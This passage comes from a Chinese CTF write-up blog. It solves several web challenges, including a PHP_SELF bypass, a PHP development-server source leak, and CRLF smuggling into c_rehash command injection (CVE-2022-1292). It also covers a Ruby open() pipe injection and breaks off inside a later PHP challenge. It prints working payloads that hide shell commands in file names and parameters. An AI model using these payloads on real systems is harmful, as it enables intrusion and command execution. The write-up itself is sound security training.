src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241224110506682.png" alt="image-20241224110506682" style="zoom: 67%;" /><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241224110501121.png" alt="image-20241224110501121" style="zoom:67%;" /><p>拿下，当初vm2没看啊！！</p><h2 id="鹤城杯-2021-EasyP"><a href="#鹤城杯-2021-EasyP" class="headerlink" title="[鹤城杯 2021]EasyP"></a>[鹤城杯 2021]EasyP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;utils.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$guess</span> === <span class="variable">$secret</span>) &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . <span class="variable">$flag</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Wrong. Try Again&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/show_source/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;show_source&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28575/index.php/utils.php/%81?show[source=1</span><br></pre></td></tr></table></figure><p>​好像也可以url编码绕过？！</p><h2 id="FSCTF-2023-签到plus"><a href="#FSCTF-2023-签到plus" class="headerlink" title="[FSCTF 2023]签到plus"></a>[FSCTF 2023]签到plus</h2><p>扫源码扫到一个shell.php</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241225153946378.png" alt="image-20241225153946378" style="zoom:80%;" /><p>然后可以看到一个假的flag</p><p>去查一一下这个php版本，发现有漏洞</p><p>PHP＜&#x3D;7.4.21 Development Server源码泄露漏洞</p><p>PHP&lt;&#x3D;7.4.21时通过<code>php -S</code>开起的WEB服务器存在源码泄露漏洞，可以将PHP文件作为静态文件直接输出源码</p><p><a href="https://blog.csdn.net/weixin_46203060/article/details/129350280">https://blog.csdn.net/weixin_46203060/article/details/129350280</a></p><p><a href="https://buaq.net/go-147962.html">https://buaq.net/go-147962.html</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">原理：</span><br><span class="line">  这里我们稍微解释一下第一个GET和第二个GET的作用分别是什么</span><br><span class="line">        第一个GET后的/phpinfo.php是直接访问已存在的phpinfo.php文件(一般可以是访问index.php)</span><br><span class="line">PHP源码中的php_cli_server_request_translate_vpath函数将请求的PHP文件的路径转换为文件系统上的完整路径。如果请求的文件是一个目录，它会检查是否存在索引文件，如index.php或 index.html，并使用其中一个文件的路径(如果找到的话)。这允许服务器响应请求提供正确的文件</span><br><span class="line">        而第二个GET后的/请求的是目录而不是文件。此PHP版本提供的代码包括一个检查，以确定请求的文件是应被视为静态文件还是作为PHP文件执行。这是通过检查文件的扩展名来完成的。如果扩展不是.php或.PHP，或者如果扩展名的长度不等于3,则该文件被视为静态文件，因此如果我们把第二个GET请求的内容改为类似1.txt的文件时，php源码将会被以静态文件的方式泄露(即直接访问获取)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241225155117505.png" alt="image-20241225155117505"></p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241225155204995.png" alt="image-20241225155204995"></p><p>直接拿下了。</p><h2 id="CISCN-2022-初赛-online-crt"><a href="#CISCN-2022-初赛-online-crt" class="headerlink" title="[CISCN 2022 初赛]online_crt"></a>[CISCN 2022 初赛]online_crt</h2><p>给了我们源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> cryptography <span class="keyword">import</span> x509</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> hashes, serialization</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.asymmetric <span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">from</span> cryptography.x509.oid <span class="keyword">import</span> NameOID</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_crt</span>(<span class="params">Country, Province, City, OrganizationalName, CommonName, EmailAddress</span>):</span><br><span class="line">    root_key = rsa.generate_private_key(</span><br><span class="line">        public_exponent=<span class="number">65537</span>,</span><br><span class="line">        key_size=<span class="number">2048</span>,</span><br><span class="line">        backend=default_backend()</span><br><span class="line">    )</span><br><span class="line">    subject = issuer = x509.Name([</span><br><span class="line">        x509.NameAttribute(NameOID.COUNTRY_NAME, Country),</span><br><span class="line">        x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, Province),</span><br><span class="line">        x509.NameAttribute(NameOID.LOCALITY_NAME, City),</span><br><span class="line">        x509.NameAttribute(NameOID.ORGANIZATION_NAME, OrganizationalName),</span><br><span class="line">        x509.NameAttribute(NameOID.COMMON_NAME, CommonName),</span><br><span class="line">        x509.NameAttribute(NameOID.EMAIL_ADDRESS, EmailAddress),</span><br><span class="line">    ])</span><br><span class="line">    root_cert = x509.CertificateBuilder().subject_name(</span><br><span class="line">        subject</span><br><span class="line">    ).issuer_name(</span><br><span class="line">        issuer</span><br><span class="line">    ).public_key(</span><br><span class="line">        root_key.public_key()</span><br><span class="line">    ).serial_number(</span><br><span class="line">        x509.random_serial_number()</span><br><span class="line">    ).not_valid_before(</span><br><span class="line">        datetime.datetime.utcnow()</span><br><span class="line">    ).not_valid_after(</span><br><span class="line">        datetime.datetime.utcnow() + datetime.timedelta(days=<span class="number">3650</span>)</span><br><span class="line">    ).sign(root_key, hashes.SHA256(), default_backend())</span><br><span class="line">    crt_name = <span class="string">&quot;static/crt/&quot;</span> + <span class="built_in">str</span>(uuid.uuid4()) + <span class="string">&quot;.crt&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(crt_name, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(root_cert.public_bytes(serialization.Encoding.PEM))</span><br><span class="line">    <span class="keyword">return</span> crt_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/getcrt&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    Country = request.form.get(<span class="string">&quot;Country&quot;</span>, <span class="string">&quot;CN&quot;</span>)</span><br><span class="line">    Province = request.form.get(<span class="string">&quot;Province&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    City = request.form.get(<span class="string">&quot;City&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    OrganizationalName = request.form.get(<span class="string">&quot;OrganizationalName&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    CommonName = request.form.get(<span class="string">&quot;CommonName&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    EmailAddress = request.form.get(<span class="string">&quot;EmailAddress&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> get_crt(Country, Province, City, OrganizationalName, CommonName, EmailAddress)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/createlink&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">info</span>():</span><br><span class="line">    json_data = &#123;<span class="string">&quot;info&quot;</span>: os.popen(<span class="string">&quot;c_rehash static/crt/ &amp;&amp; ls static/crt/&quot;</span>).read()&#125;</span><br><span class="line">    <span class="keyword">return</span> json.dumps(json_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/proxy&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proxy</span>():</span><br><span class="line">    uri = request.form.get(<span class="string">&quot;uri&quot;</span>, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">    client = socket.socket()</span><br><span class="line">    client.connect((<span class="string">&#x27;localhost&#x27;</span>, <span class="number">8887</span>))</span><br><span class="line">    msg = <span class="string">f&#x27;&#x27;&#x27;GET <span class="subst">&#123;uri&#125;</span> HTTP/1.1</span></span><br><span class="line"><span class="string">Host: test_api_host</span></span><br><span class="line"><span class="string">User-Agent: Guest</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    client.send(msg.encode())</span><br><span class="line">    data = client.recv(<span class="number">2048</span>)</span><br><span class="line">    client.close()</span><br><span class="line">    <span class="keyword">return</span> data.decode()</span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8888</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">admin</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">staticPath := <span class="string">&quot;/app/static/crt/&quot;</span></span><br><span class="line">oldname := c.DefaultQuery(<span class="string">&quot;oldname&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">newname := c.DefaultQuery(<span class="string">&quot;newname&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> oldname == <span class="string">&quot;&quot;</span> || newname == <span class="string">&quot;&quot;</span> || strings.Contains(oldname, <span class="string">&quot;..&quot;</span>) || strings.Contains(newname, <span class="string">&quot;..&quot;</span>) &#123;</span><br><span class="line">c.String(<span class="number">500</span>, <span class="string">&quot;error&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> c.Request.URL.RawPath != <span class="string">&quot;&quot;</span> &amp;&amp; c.Request.Host == <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">err := os.Rename(staticPath+oldname, staticPath+newname)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.String(<span class="number">200</span>, newname)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.String(<span class="number">200</span>, <span class="string">&quot;no&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">index</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">c.String(<span class="number">200</span>, <span class="string">&quot;hello world&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">router := gin.Default()</span><br><span class="line">router.GET(<span class="string">&quot;/&quot;</span>, index)</span><br><span class="line">router.GET(<span class="string">&quot;/admin/rename&quot;</span>, admin)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := router.Run(<span class="string">&quot;:8887&quot;</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>主要看一个python文件和一个go文件，先分析一下功能点</p><p>先看python文件，&#x2F;getcrt路由是生成一个crt证书并return给我们，&#x2F;createlink是一种命令执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c_rehash static/crt/ &amp;&amp; ls static/crt/</span><br></pre></td></tr></table></figure><p>利用了c_rehash进行执行。这里c_rehash其实存在CVE-2022-1292。</p><p>c_rehash是openssl中的一个用perl编写的脚本工具，用于批量创建证书等文件 hash命名的符号链接，是当用户可控文件名时的命令注入</p><p>他会执行文件名的内容，当文件名存在反引号时！</p><p>cve分析：</p><p><a href="https://xz.aliyun.com/t/11703?time__1311=Cq0xRiqiuQDsD7CG7KGODcG7Fit34Eox">https://xz.aliyun.com/t/11703?time__1311=Cq0xRiqiuQDsD7CG7KGODcG7Fit34Eox</a></p><p>然后看&#x2F;proxy，与自身的8887端口建立连接，8887端口对应go服务，将两种语言联系在了一起。这里的uri是可控的，我们可以通过CRLF构造任意数据包。我们也必须要CRLF来构造，因为存在c.Request.URL.RawPath !&#x3D; “” &amp;&amp; c.Request.Host &#x3D;&#x3D; “admin”</p><p><strong>go的RawPath特性：</strong></p><p>通过阅读go net库的源码<br>我发现在go中会对原始url进行反转义操作(URL解码)<br>如果反转义后再次转义的url与原始url不同 那么RawPath会被设置为原始url 反之置为空</p><p>因此我们只要随便对一个斜杠进行url编码即可。</p><p>然后就可以构造恶意数据包了。然后通过表单传入uri即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">uri=<span class="string">&#x27;&#x27;&#x27;/admin%2frename?oldname=b58a6a37-6cc5-46bf-a98f-d589a9957a1f.crt&amp;newname=`echo%20bHMgLw==|base64%20-d|bash&gt;flag`.crt HTTP/1.1</span></span><br><span class="line"><span class="string">Host: admin</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">GET /&#x27;&#x27;&#x27;</span></span><br><span class="line">gopher = uri.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">payload=urllib.parse.quote(gopher)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><p>此处的作用是ls &#x2F;</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241227153626689.png" alt="image-20241227153626689" style="zoom: 67%;" /><p>成功后&#x2F;createlink一下让他执行命令。</p><p>然后去&#x2F;static&#x2F;crt&#x2F;访问即可</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241227153710490.png" alt="image-20241227153710490" style="zoom:80%;" /><p>同理可读flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;ee493ebd-0ef5-4594-baa9-ec7ad1a5f601&#125;</span><br></pre></td></tr></table></figure><h2 id="第五空间-2021-PNG图片转换器"><a href="#第五空间-2021-PNG图片转换器" class="headerlink" title="[第五空间 2021]PNG图片转换器"></a>[第五空间 2021]PNG图片转换器</h2><p>给了源码：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;digest&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;base64&#x27;</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  open(<span class="string">&quot;./view/index.html&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/upload&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  open(<span class="string">&quot;./view/upload.html&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">&#x27;/upload&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">unless</span> params[<span class="symbol">:file</span>] &amp;&amp; params[<span class="symbol">:file</span>][<span class="symbol">:tempfile</span>] &amp;&amp; params[<span class="symbol">:file</span>][<span class="symbol">:filename</span>] &amp;&amp; params[<span class="symbol">:file</span>][<span class="symbol">:filename</span>].split(<span class="string">&#x27;.&#x27;</span>)[-<span class="number">1</span>] == <span class="string">&#x27;png&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;error&#x27;);location.href=&#x27;/upload&#x27;;&lt;/script&gt;&quot;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">begin</span></span><br><span class="line">    filename = <span class="title class_">Digest</span><span class="symbol">:</span><span class="symbol">:MD5</span>.hexdigest(<span class="title class_">Time</span>.now.to_i.to_s + params[<span class="symbol">:file</span>][<span class="symbol">:filename</span>]) + <span class="string">&#x27;.png&#x27;</span></span><br><span class="line">    open(filename, <span class="string">&#x27;wb&#x27;</span>) &#123; |<span class="params">f</span>|</span><br><span class="line">      f.write open(params[<span class="symbol">:file</span>][<span class="symbol">:tempfile</span>],<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="string">&quot;Upload success, file stored at <span class="subst">#&#123;filename&#125;</span>&quot;</span></span><br><span class="line">  <span class="keyword">rescue</span></span><br><span class="line">    <span class="string">&#x27;something wrong&#x27;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/convert&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  open(<span class="string">&quot;./view/convert.html&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">&#x27;/convert&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">begin</span></span><br><span class="line">    <span class="keyword">unless</span> params[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;error&#x27;);location.href=&#x27;/convert&#x27;;&lt;/script&gt;&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    file = params[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">unless</span> file.index(<span class="string">&#x27;..&#x27;</span>) == <span class="literal">nil</span> &amp;&amp; file.index(<span class="string">&#x27;/&#x27;</span>) == <span class="literal">nil</span> &amp;&amp; file =~ <span class="regexp">/^(.+)\.png$/</span></span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;dont hack me&#x27;);&lt;/script&gt;&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    res = open(file, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">    headers <span class="string">&#x27;Content-Type&#x27;</span> =&gt; <span class="string">&quot;text/html; charset=utf-8&quot;</span></span><br><span class="line">    <span class="string">&quot;var img = document.createElement(\&quot;img\&quot;);\nimg.src= \&quot;data:image/png;base64,&quot;</span> + <span class="title class_">Base64</span>.encode64(res).gsub(<span class="regexp">/\s*/</span>, <span class="string">&#x27;&#x27;</span>) + <span class="string">&quot;\&quot;;\n&quot;</span></span><br><span class="line">  <span class="keyword">rescue</span></span><br><span class="line">    <span class="string">&#x27;something wrong&#x27;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>上传后的文件也只能是png后缀的，文件上传漏洞是不太可能存在的。</p><p>这里考察的是ruby的file open漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open()函数可以进行命令执行</span><br></pre></td></tr></table></figure><p>将文件名构造成恶意payload即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=|`echo+ZW52|base64+-d`;cat+1.png</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241230171141882.png" alt="image-20241230171141882"></p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241230171148314.png" alt="image-20241230171148314" style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;d95c546d-fb51-4696-b923-66d3758d20c6&#125;</span><br></pre></td></tr></table></figure><h2 id="GHCTF-2024-新生赛-ezzz-unserialize"><a href="#GHCTF-2024-新生赛-ezzz-unserialize" class="headerlink" title="[GHCTF 2024 新生赛]ezzz_unserialize"></a>[GHCTF 2024 新生赛]ezzz_unserialize</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 